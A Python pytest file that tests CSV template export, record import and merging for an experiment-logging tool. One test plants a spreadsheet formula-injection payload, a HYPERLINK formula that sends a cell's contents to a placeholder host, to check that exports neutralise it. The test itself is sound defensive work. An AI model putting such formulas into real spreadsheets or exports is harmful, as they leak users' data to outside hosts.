from __future__ import annotations

import csv
import json
from datetime import timedelta, timezone

import pytest
import yaml

from mblab.csvcells import FORMULA_STARTS
from mblab.exchange import (
    import_file,
    merge_records,
    parse_timezone,
    template_columns,
    write_template_csv,
)
from mblab.plan import generate_plan
from mblab.schema import ExperimentDefinition
from mblab.study import Study, StudyError, save_plan, template_text

from .conftest import FIXED_NOW, make_record, write_records


def _template_rows(study_dir):
    study = Study.load(study_dir)
    path = study_dir / "exports" / "t.csv"
    write_template_csv(study, path)
    with path.open(encoding="utf-8-sig", newline="") as handle:
        return study, path, list(csv.DictReader(handle))


def _write_rows(path, rows):
    with path.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)


def test_template_has_one_row_per_planned_run(study_dir):
    study, _, rows = _template_rows(study_dir)
    assert len(rows) == 72
    assert list(rows[0]) == template_columns(study)
    assert rows[0]["run_id"] == "B:T1:r1" and rows[0]["sequence"] == "1"
    assert rows[0]["prompt_text"] == study.definition.task("T1").prompt
    assert "confounder.memory" in rows[0]


def test_import_filled_rows_and_skip_blank_ones(study_dir):
    study, path, rows = _template_rows(study_dir)
    rows[0].update(
        timestamp="2026-11-20T10:00:00+09:00",
        client_version="1.2026.300",
        response_text="...\nANSWER: 265",
        latency_seconds="12,5",
        thinking_text="Thought for 4s",
        **{"confounder.memory": "disabled"},
    )
    rows[1].update(
        timestamp="2026-11-20T10:05:00",
        client_version="1.2026.300",
        response_status="error",
    )
    _write_rows(path, rows)

    naive = import_file(study, path)
    assert len(naive.errors) == 1 and "no UTC offset" in naive.errors[0]

    result = import_file(study, path, default_tz=timezone(timedelta(hours=9)))
    assert result.errors == []
    assert result.skipped_blank == 70
    first, second = result.records
    assert first.response_status == "completed"
    assert first.latency_method == "manual_stopwatch" and first.latency_seconds == 12.5
    assert first.thinking_indicator == "shown" and first.thinking_seconds == 4
    assert first.confounders == {"memory": "disabled"}
    assert first.definition_sha256 == study.plan.definition_sha256
    assert second.response_status == "error"
    assert second.timestamp.utcoffset() == timedelta(hours=9)


def test_import_rejects_rows_that_contradict_the_plan(study_dir):
    study, path, rows = _template_rows(study_dir)
    rows[0].update(
        timestamp="2026-11-20T10:00:00+09:00",
        client_version="1",
        response_text="ANSWER: 1",
        condition_id="A",
    )
    _write_rows(path, rows)
    result = import_file(study, path)
    assert result.records == []
    assert "condition_id is 'A' but the plan says 'B'" in result.errors[0]


def test_json_and_jsonl_roundtrip(study_dir, definition, plan, tmp_path):
    recs = [make_record(definition, plan, rid) for rid in ("A:T1:r1", "B:T2:r1")]
    as_json = tmp_path / "recs.json"
    as_json.write_text(json.dumps([r.model_dump(mode="json") for r in recs]), encoding="utf-8")
    as_jsonl = tmp_path / "recs.jsonl"
    as_jsonl.write_text("".join(r.model_dump_json() + "\n" for r in recs), encoding="utf-8")
    study = Study.load(study_dir)
    for path in (as_json, as_jsonl):
        result = import_file(study, path)
        assert result.errors == [] and result.records == recs


def test_unsupported_file_type(study_dir, tmp_path):
    bad = tmp_path / "x.xlsx"
    bad.write_text("", encoding="utf-8")
    with pytest.raises(StudyError, match="unsupported file type"):
        import_file(Study.load(study_dir), bad)


def test_merge_refuses_duplicates_unless_replace(study_dir, definition, plan):
    original = make_record(definition, plan, "A:T1:r1", notes="first")
    write_records(study_dir, [original])
    study = Study.load(study_dir)
    newer = make_record(definition, plan, "A:T1:r1", notes="second")
    other = make_record(definition, plan, "A:T2:r1")

    conflict = merge_records(study, [newer, other], replace=False, dry_run=False)
    assert conflict.conflicts == ["A:T1:r1"]
    assert len(Study.load(study_dir).records) == 1  # nothing written

    dry = merge_records(study, [newer, other], replace=True, dry_run=True)
    assert (dry.replaced, dry.added) == (["A:T1:r1"], ["A:T2:r1"])
    assert len(Study.load(study_dir).records) == 1

    merge_records(study, [newer, other], replace=True, dry_run=False)
    stored = {r.run_id: r for r in Study.load(study_dir).records}
    assert stored["A:T1:r1"].notes == "second" and "A:T2:r1" in stored

    with pytest.raises(StudyError, match="several records"):
        merge_records(study, [other, other], replace=True, dry_run=True)


@pytest.mark.parametrize(
    ("value", "offset"),
    [("+09:00", 9), ("-0500", -5), ("UTC", 0), ("Asia/Seoul", 9)],
)
def test_parse_timezone(value, offset):
    from datetime import datetime

    tz = parse_timezone(value)
    assert datetime(2026, 11, 20, tzinfo=tz).utcoffset() == timedelta(hours=offset)


def test_parse_timezone_rejects_garbage():
    with pytest.raises(StudyError):
        parse_timezone("+9")
    with pytest.raises(StudyError):
        parse_timezone("Mars/Olympus")
    assert parse_timezone(None) is None


def _one_filled_row(study_dir, **values):
    study, path, rows = _template_rows(study_dir)
    row = rows[0]  # B:T1:r1
    row.update(
        timestamp="2026-11-20T10:00:00+09:00",
        client_version="1.0",
        response_text="ANSWER: 265",
        **values,
    )
    _write_rows(path, [row])
    return study, path


def test_template_is_utf8_with_a_byte_order_mark(study_dir):
    _, path, _ = _template_rows(study_dir)
    assert path.read_bytes().startswith(b"\xef\xbb\xbf")


def test_prompt_whitespace_changes_keep_the_planned_prompt(study_dir):
    planned = Study.load(study_dir).definition.task("T1").prompt
    study, path = _one_filled_row(study_dir, prompt_text=planned.replace("\n", "\r\n") + "  ")
    (record,) = import_file(study, path).records
    assert record.prompt_text == planned


def test_a_changed_prompt_needs_a_recorded_deviation(study_dir):
    garbled = "A train departs at 09:47 â€” and arrives at 14:12."
    study, path = _one_filled_row(study_dir, prompt_text=garbled)
    result = import_file(study, path)
    assert result.records == [] and "prompt_text differs from the task prompt" in result.errors[0]

    study, path = _one_filled_row(
        study_dir, prompt_text=garbled, protocol_deviation="sent a shortened prompt by mistake"
    )
    (record,) = import_file(study, path).records
    assert record.prompt_text == garbled and record.excluded


def test_non_utf8_csv_gets_a_clear_error(study_dir):
    study, path = _one_filled_row(study_dir, notes="café")
    path.write_bytes(path.read_text(encoding="utf-8-sig").encode("cp1252"))
    with pytest.raises(StudyError, match=r'not UTF-8 text.*"CSV UTF-8"'):
        import_file(study, path)


def test_template_keeps_formulas_out_and_imports_them_back(tmp_path):
    data = yaml.safe_load(template_text())
    formula = '=HYPERLINK("https://example.invalid/?d="&A1,"Open")'
    data["tasks"][0]["prompt"] = formula  # T1, e.g. from a study file shared by someone else
    root = tmp_path / "formula"
    root.mkdir()
    (root / "experiment.yaml").write_text(yaml.safe_dump(data), encoding="utf-8")
    save_plan(
        generate_plan(ExperimentDefinition.model_validate(data), now=FIXED_NOW),
        root / "plan.json",
    )
    study, path, rows = _template_rows(root)
    for row in rows:
        assert not [v for v in row.values() if v and v[0] in FORMULA_STARTS], row
    row = next(r for r in rows if r["task_id"] == "T1")
    assert row["prompt_text"] == "'" + formula
    row.update(timestamp="2026-11-20T10:00:00+09:00", client_version="1.0", response_text="A")
    _write_rows(path, [row])
    result = import_file(study, path)
    assert result.errors == []
    (record,) = result.records
    assert record.prompt_text == formula and not record.excluded  # no deviation needed


def test_template_names_the_experiment_and_import_checks_it(study_dir):
    study, _, rows = _template_rows(study_dir)
    assert rows[0]["experiment_id"] == study.definition.experiment_id
    study, path = _one_filled_row(study_dir, experiment_id="another-study")
    result = import_file(study, path)
    assert result.records == [] and "experiment_id is 'another-study'" in result.errors[0]


def test_json_import_refuses_records_that_do_not_fit_the_plan(
    study_dir, definition, plan, tmp_path
):
    good = make_record(definition, plan, "A:T1:r1")
    other_study = make_record(definition, plan, "A:T2:r1").model_copy(
        update={"experiment_id": "another-study"}
    )
    relabelled = make_record(definition, plan, "A:T3:r1").model_copy(update={"condition_id": "B"})
    unplanned = good.model_copy(update={"run_id": "Z:T1:r1"})
    path = tmp_path / "in.jsonl"
    path.write_text(
        "".join(r.model_dump_json() + "\n" for r in [good, other_study, relabelled, unplanned]),
        encoding="utf-8",
    )
    result = import_file(Study.load(study_dir), path)
    assert [r.run_id for r in result.records] == ["A:T1:r1"]
    messages = " | ".join(result.errors)
    assert "item 2: run A:T2:r1: experiment_id is 'another-study'" in messages
    assert "another study or a pilot" in messages
    assert "item 3: run A:T3:r1: condition_id is 'B' but the plan says 'A'" in messages
    assert "item 4: run Z:T1:r1: not in this study's plan" in messages
